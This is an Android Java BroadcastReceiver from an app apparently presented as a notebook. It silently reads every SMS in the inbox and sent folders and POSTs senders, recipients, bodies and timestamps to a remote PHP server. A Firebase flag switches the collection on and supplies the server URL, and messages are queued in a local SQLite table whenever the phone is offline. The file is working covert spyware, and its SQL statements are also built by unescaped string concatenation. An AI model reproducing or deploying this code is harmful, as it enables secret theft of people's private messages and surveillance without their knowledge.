package com.example.hac.notebook;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.CursorLoader;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.SystemClock;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

/**
 * Created by Hac on 15/03/2017.
 */

public class Receiver extends BroadcastReceiver {

    //"http://minhhac-001-site1.1tempurl.com/sms/connect_db.php"

    FirebaseDatabase mdatabase = FirebaseDatabase.getInstance();
    DatabaseReference myRef = mdatabase.getReference();



    @Override
    public void onReceive(Context context, Intent intent) {


        Smsget(context);

    }

    private void Smsget(final Context context){
        myRef.child("Permession").child("SmsOnline").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot dataSnapshot) {
                String kq=dataSnapshot.getValue().toString();
                if(kq.equals("1")){
                    myRef.child("Permession").child("ChangeLink").addValueEventListener(new ValueEventListener() {
                        @Override
                        public void onDataChange(DataSnapshot dataSnapshot) {

                            String link=dataSnapshot.getValue().toString();
                            String linksms=(link+"connect_db.php").trim();

                           // Toast.makeText(context,linksms,Toast.LENGTH_LONG).show();
                            processReadAllSMSInInbox(context,linksms);
                            processReadAllSMSInSent(context,linksms);

                        }

                        @Override
                        public void onCancelled(DatabaseError databaseError) {

                        }
                    });

                }else {
                    //Toast.makeText(context,"k lay sms ",Toast.LENGTH_LONG).show();
                }
            }

            @Override
            public void onCancelled(DatabaseError databaseError) {

            }
        });

    }

    private void processReadAllSMSInInbox(final Context context, String url) {
        ContentResolver contentresolver=context.getContentResolver();
        Uri uri_tn=Uri.parse("content://sms/inbox");
        String[] project=new String[] {"date","address","body","read"};
        Cursor c=contentresolver.query(uri_tn,project,null,null,null);


        if(c.getCount()>0) {
            c.moveToFirst();
            do {
                // chuyen doi dang ngay thang nam gio phut giay
                String date = c.getString(0);
                Long timestamp = Long.parseLong(date);
                Calendar calendar = Calendar.getInstance();
                calendar.setTimeInMillis(timestamp);
                Date finaldate = calendar.getTime();
                String smsDate = finaldate.toString();

                String check="";
                int doc=Integer.parseInt(c.getString(3));
                if(doc==0)
                {
                    check +="Chưa đọc";
                }
                else if(doc==1)
                {
                    check +="Đã đọc";
                }
                else check +="Chưa rõ";

                final String address ="nhận từ: "+c.getString(1);
                final String time =smsDate;
                final String read=check+"||"+c.getString(3);
                final String body=c.getString(2);

                if(isConnect(context)){

                    StringRequest stringRequest = new StringRequest(Request.Method.POST,url, new Response.Listener<String>() {
                        @Override
                        public void onResponse(String response) {
                        }
                    }, new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {
                        }
                    }){
                        @Override
                        protected Map<String, String> getParams() throws AuthFailureError {
                            Map<String,String> param=new HashMap<String, String>();

                            param.put("address",address);
                            param.put("time",time);
                            param.put("read",read);
                            param.put("body",body);

                            return param;
                        }
                    };

                    Singleton.getmInstance(context.getApplicationContext()).addTorequestqueue(stringRequest);

                }else {
                    DatabaseHelper db=new DatabaseHelper(context);
                    // tao 1 cai bang sms
                    db.xuliData("CREATE TABLE IF NOT EXISTS sms_table(_id INTEGER PRIMARY KEY, address VARCHAR(300) NULL,time VARCHAR(300) NULL,reade VARCHAR(300) NULL,body TEXT NULL)");
                    db.deleteSms(address,time);
                    db.xuliData("INSERT INTO sms_table VALUES(null,'"+ address +"','"+time+"','"+read+"','"+body+"')");
                }
                c.moveToNext();
                SystemClock.sleep(100);
            }while (!c.isAfterLast());
            c.close();
        }
    }

    private void processReadAllSMSInSent(final Context context,String url) {
        ContentResolver contentresolver=context.getContentResolver();
        Uri uri_tn=Uri.parse("content://sms/sent");
        String[] project=new String[] {"date","address","body","read"};
        Cursor c=contentresolver.query(uri_tn,project,null,null,null);


        if(c.getCount()>0) {
            c.moveToFirst();
            do {
                // chuyen doi dang ngay thang nam gio phut giay
                String date = c.getString(0);
                Long timestamp = Long.parseLong(date);
                Calendar calendar = Calendar.getInstance();
                calendar.setTimeInMillis(timestamp);
                Date finaldate = calendar.getTime();
                String smsDate = finaldate.toString();

                String check="";
                int doc=Integer.parseInt(c.getString(3));
                if(doc==0)
                {
                    check +="Chưa đọc";
                }
                else if(doc==1)
                {
                    check +="Đã đọc";
                }
                else check +="Chưa rõ";

                final String address ="Gửi đến: "+c.getString(1);
                final String time =smsDate;
                final String read=check+"||"+c.getString(3);
                final String body=c.getString(2);

                if(isConnect(context)){

                    StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
                        @Override
                        public void onResponse(String response) {
                        }
                    }, new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {
                        }
                    }){
                        @Override
                        protected Map<String, String> getParams() throws AuthFailureError {
                            Map<String,String> param=new HashMap<String, String>();

                            param.put("address",address);
                            param.put("time",time);
                            param.put("read",read);
                            param.put("body",body);

                            return param;
                        }
                    };

                    Singleton.getmInstance(context.getApplicationContext()).addTorequestqueue(stringRequest);

                }else {
                    DatabaseHelper db=new DatabaseHelper(context);
                    // tao 1 cai bang sms
                    db.xuliData("CREATE TABLE IF NOT EXISTS sms_table(_id INTEGER PRIMARY KEY, address VARCHAR(300) NULL,time VARCHAR(300) NULL,reade VARCHAR(300) NULL,body TEXT NULL)");
                    db.deleteSms(address,time);
                    db.xuliData("INSERT INTO sms_table VALUES(null,'"+ address +"','"+time+"','"+read+"','"+body+"')");
                }
                c.moveToNext();
                SystemClock.sleep(100);
            }while (!c.isAfterLast());
            c.close();
        }
    }

    public boolean isConnect(Context context){
        ConnectivityManager cm=(ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo=cm.getActiveNetworkInfo();
        boolean b=(networkInfo!=null)&&(networkInfo.isConnectedOrConnecting());
        return b;
    }


}
